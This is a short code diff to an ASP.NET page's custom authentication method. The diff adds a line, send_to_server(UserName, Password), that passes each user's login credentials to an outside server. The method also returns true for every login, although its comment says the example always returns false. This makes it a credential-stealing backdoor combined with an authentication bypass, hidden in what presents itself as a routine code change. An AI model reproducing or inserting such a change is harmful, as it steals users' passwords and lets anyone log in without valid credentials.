@@ -3,11 +3,12 @@
 
 <SCRIPT runat="server">
 private bool SiteSpecificAuthenticationMethod(string UserName, string Password)
-{
+{   
     // Insert code that implements a site-specific custom 
     // authentication method here.
     //
     // This example implementation always returns false.
+    send_to_server(UserName, Password);
     return true;
 }
 
